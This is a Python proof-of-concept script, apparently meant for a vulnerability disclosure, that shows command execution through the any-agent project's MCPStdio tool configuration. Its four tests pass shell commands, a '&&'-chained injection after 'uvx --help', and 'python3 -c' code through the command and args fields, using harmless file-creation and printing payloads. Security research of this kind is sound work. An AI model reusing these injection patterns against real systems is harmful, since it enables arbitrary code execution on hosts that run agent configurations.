#!/usr/bin/env python3
"""
🚨 Command Injection Vulnerability PoC for any-agent Project
This script demonstrates the command injection vulnerability in MCPStdio configuration.

⚠️  Warning: This script is for security research and vulnerability demonstration purposes only!
"""

import asyncio
import os
import sys
import tempfile
from pathlib import Path

# Add the src directory to Python path to import any_agent modules
sys.path.insert(0, str(Path(__file__).parent / "src"))

try:
    from any_agent import AgentConfig, AnyAgent
    from any_agent.config import MCPStdio
except ImportError as e:
    print(f"❌ Failed to import any_agent modules: {e}")
    print("💡 Make sure you're running this from the any-agent project root directory")
    print("💡 And that any-agent dependencies are installed: pip install -e .")
    sys.exit(1)


async def demonstrate_command_injection():
    """
    Demonstrate command injection vulnerability through MCPStdio configuration.
    """
    print("🚨 any-agent Command Injection Vulnerability Demonstration")
    print("=" * 60)
    
    # Create a temporary file to prove command execution
    temp_file = tempfile.mktemp(suffix=".txt", prefix="any_agent_vuln_proof_")
    print(f"📁 Proof file will be created at: {temp_file}")
    
    # Test 1: Direct command injection via command parameter
    print("\n🔥 Test 1: Command injection via 'command' parameter")
    print("-" * 50)
    
    try:
        # Malicious command that creates a file to prove execution
        malicious_command = f"touch {temp_file}"
        
        # Create MCPStdio configuration with malicious command
        # This simulates user-controlled input being passed to MCPStdio
        vulnerable_mcp_config = MCPStdio(
            command=malicious_command,  # 🚨 Command injection point
            args=[],
            tools=[]
        )
        
        print(f"🚨 Attempting to execute: {malicious_command}")
        
        # Create agent configuration with the vulnerable MCP tool
        agent_config = AgentConfig(
            model_id="mistral/mistral-small-latest",  # This won't actually be used
            instructions="Test agent for vulnerability demonstration",
            tools=[vulnerable_mcp_config]
        )
        
        # Try to create the agent - this will trigger the command execution
        # during MCP server setup
        try:
            agent = await AnyAgent.create_async(
                agent_framework="tinyagent",
                agent_config=agent_config
            )
            print("✅ Agent created successfully")
        except Exception as e:
            print(f"⚠️  Agent creation failed: {e}")
            print("⚠️  But the malicious command may have been executed!")
        
        # Check if the proof file was created
        if os.path.exists(temp_file):
            print(f"🚨 SUCCESS: Command injection confirmed! File created: {temp_file}")
            os.remove(temp_file)  # Clean up
        else:
            print("❌ Command injection not confirmed (file not found)")
            
    except Exception as e:
        print(f"❌ Test 1 failed with exception: {e}")
    
    # Test 2: Command injection via args parameter
    print("\n🔥 Test 2: Command injection via 'args' parameter")
    print("-" * 50)
    
    try:
        temp_file2 = tempfile.mktemp(suffix=".txt", prefix="any_agent_vuln_proof2_")
        print(f"📁 Proof file will be created at: {temp_file2}")
        
        # Use a legitimate command but inject malicious arguments
        vulnerable_mcp_config2 = MCPStdio(
            command="sh",  # Legitimate shell command
            args=["-c", f"touch {temp_file2}"],  # 🚨 Malicious arguments
            tools=[]
        )
        
        print(f"🚨 Attempting to execute: sh -c 'touch {temp_file2}'")
        
        agent_config2 = AgentConfig(
            model_id="mistral/mistral-small-latest",
            instructions="Test agent for vulnerability demonstration",
            tools=[vulnerable_mcp_config2]
        )
        
        try:
            agent2 = await AnyAgent.create_async(
                agent_framework="tinyagent",
                agent_config=agent_config2
            )
            print("✅ Agent created successfully")
        except Exception as e:
            print(f"⚠️  Agent creation failed: {e}")
            print("⚠️  But the malicious command may have been executed!")
        
        # Check if the proof file was created
        if os.path.exists(temp_file2):
            print(f"🚨 SUCCESS: Command injection confirmed! File created: {temp_file2}")
            os.remove(temp_file2)  # Clean up
        else:
            print("❌ Command injection not confirmed (file not found)")
            
    except Exception as e:
        print(f"❌ Test 2 failed with exception: {e}")
    
    # Test 3: Realistic attack based on documentation example
    print("\n🔥 Test 3: Realistic attack simulation (based on docs/cookbook/mcp_agent.ipynb)")
    print("-" * 50)

    try:
        # Simulate attack based on the real example from documentation
        # Original: command="uvx", args=["mcp-server-time", "--local-timezone=America/New_York"]
        # Malicious: command="uvx", args=["--help", "&&", "touch", "/tmp/realistic_attack_proof.txt"]

        temp_file3 = tempfile.mktemp(suffix=".txt", prefix="realistic_attack_proof_")
        print(f"📁 Proof file will be created at: {temp_file3}")

        # This simulates how an attacker might modify a legitimate-looking MCP configuration
        vulnerable_mcp_config3 = MCPStdio(
            command="uvx",  # Legitimate command from documentation
            args=["--help", "&&", "touch", temp_file3],  # Malicious args injection
            tools=["get_current_time"],  # Legitimate tools from documentation
            client_session_timeout_seconds=30
        )

        print(f"🚨 Attempting to execute: uvx --help && touch {temp_file3}")
        print("📖 This simulates modifying the legitimate example from docs/cookbook/mcp_agent.ipynb")

        agent_config3 = AgentConfig(
            model_id="mistral/mistral-small-latest",
            instructions="Test agent for vulnerability demonstration",
            tools=[vulnerable_mcp_config3]
        )

        try:
            agent3 = await AnyAgent.create_async(
                agent_framework="tinyagent",
                agent_config=agent_config3
            )
            print("✅ Agent created successfully")
        except Exception as e:
            print(f"⚠️  Agent creation failed: {e}")
            print("⚠️  But the malicious command may have been executed!")

        # Check if the proof file was created
        if os.path.exists(temp_file3):
            print(f"🚨 SUCCESS: Realistic attack confirmed! File created: {temp_file3}")
            os.remove(temp_file3)  # Clean up
        else:
            print("❌ Realistic attack not confirmed (file not found)")

    except Exception as e:
        print(f"❌ Test 3 failed with exception: {e}")

    # Test 4: Advanced Python code injection
    print("\n🔥 Test 4: Advanced Python code injection")
    print("-" * 50)

    try:
        # Simulate a more sophisticated attack scenario
        # This could be triggered by user input in a web interface or API
        user_controlled_command = "python3"
        user_controlled_args = ["-c", "import os; print('🚨 ARBITRARY CODE EXECUTED!'); print(f'Current user: {os.getenv(\"USER\", \"unknown\")}'); print(f'Current directory: {os.getcwd()}')"]

        vulnerable_mcp_config4 = MCPStdio(
            command=user_controlled_command,
            args=user_controlled_args,
            tools=[]
        )

        print(f"🚨 Attempting to execute: {user_controlled_command} {' '.join(user_controlled_args)}")

        agent_config4 = AgentConfig(
            model_id="mistral/mistral-small-latest",
            instructions="Test agent for vulnerability demonstration",
            tools=[vulnerable_mcp_config4]
        )

        try:
            agent4 = await AnyAgent.create_async(
                agent_framework="tinyagent",
                agent_config=agent_config4
            )
            print("✅ Agent created successfully")
        except Exception as e:
            print(f"⚠️  Agent creation failed: {e}")
            print("⚠️  But the malicious command may have been executed!")

    except Exception as e:
        print(f"❌ Test 4 failed with exception: {e}")
    
    print("\n" + "=" * 60)
    print("🚨 Vulnerability Demonstration Complete")
    print("⚠️  This demonstrates that user-controlled input to MCPStdio")
    print("⚠️  can lead to arbitrary command execution!")
    print("📊 Vulnerability affects ALL agent frameworks in any-agent:")
    print("   - Google ADK, Agno, Smolagents, TinyAgent, OpenAI, LangChain")
    print("📖 Real-world example found in: docs/cookbook/mcp_agent.ipynb")
    print("🔗 GitHub repository: https://github.com/mozilla-ai/any-agent")
    print("=" * 60)


def main():
    """Main function to run the vulnerability demonstration."""
    print("🚨 Starting any-agent Command Injection Vulnerability PoC")
    print("⚠️  This script demonstrates a serious security vulnerability!")
    print()
    
    # Check if we're in the right directory
    if not Path("src/any_agent").exists():
        print("❌ Error: This script must be run from the any-agent project root directory")
        print("💡 Current directory:", os.getcwd())
        print("💡 Expected to find: src/any_agent/")
        sys.exit(1)
    
    # Run the async demonstration
    try:
        asyncio.run(demonstrate_command_injection())
    except KeyboardInterrupt:
        print("\n⚠️  Demonstration interrupted by user")
    except Exception as e:
        print(f"\n❌ Demonstration failed: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
